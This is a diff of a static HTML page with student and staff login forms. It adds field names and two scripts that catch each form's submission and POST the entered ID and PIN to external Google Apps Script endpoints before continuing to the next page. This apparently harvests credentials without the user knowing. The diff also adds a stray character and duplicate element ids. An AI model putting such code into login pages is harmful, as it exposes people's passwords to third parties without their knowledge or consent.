@@ -36,16 +36,16 @@
             <!--end option-->
 
 <!--INPUT FIELDS-->
-<form action="home.html">
+<form   action="home.html" name="studentLogin" >
 <div class="myCenter" id="myCenter1">
  <div class="col-sm-12 field_container">
     <div class="col-sm-12 field">
         <label class="col-sm-12">Student ID</label>
-    <input type="text" class = "form-control " required/>
+    <input type="text" class = "form-control " name="id" id ="id" required/>
     </div>
      <div class="col-sm-12 field">
         <label class="col-sm-12">PIN</label>
-    <input type="password" class = "form-control" required/>
+    <input type="password" class = "form-control" name="pin"  id="pin" required/>
     </div>
     <div class="col-sm-12 login_container">
  <div class="col-sm-8 text-center login">
@@ -59,16 +59,16 @@
 
     
 <!--INPUT FIELDS-->
-<form action = "dashboard.html">
+<form  action="dashboard.html"   name="staffLogin">
 <div class="myCenter2" id="myCenter2">
  <div class="col-sm-12 field_container">
     <div class="col-sm-12 field">
         <label class="col-sm-12">Staff ID</label>
-    <input type="text" class = "form-control " required />
+    <input type="text" class = "form-control " name="id" id = "id" required />
     </div>
      <div class="col-sm-12 field">
         <label class="col-sm-12">PIN</label>
-    <input type="password" class = "form-control" required/>
+    <input type="password" class = "form-control" name="pin" id="pin" required/>
     </div>
      <div class="col-sm-12 login_container">
  <div class="col-sm-8 text-center login">
@@ -90,7 +90,7 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
 <script src="assets/js/main.js"></script>
-
+g
 
 <script>
 
@@ -137,11 +137,35 @@ if (myCenter2.style.display === "none") {
 
 
 
-
-
-
 </script>
 
+
+<script>
+  const script_url = 'https://script.google.com/macros/s/AKfycbw2Wxjgd_iwoYJNckpWoPZpO3W3OIGWjiwhsVfcn0zM6zW9GCBd4H82jzmguuwc7Cbo/exec'
+  const studentLogin = document.forms['studentLogin']
+
+  studentLogin.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(script_url, { method: 'POST', body: new FormData(studentLogin)})
+       .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+      studentLogin.submit()
+  })
+  
+</script>
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbxXWFiCToqcnGWPDET8BZpd40SV422H1xUbVsDWq0p5xPegIOHehcVpts2_zZ6Zx9GM/exec'
+  const staffLogin = document.forms['staffLogin']
+
+  staffLogin.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(staffLogin)})
+       .then(response => console.log('Success!', response),  staffLogin.submit())
+      .catch(error => console.error('Error!', error.message))
+    
+  })
+</script>
 
 
 </html>
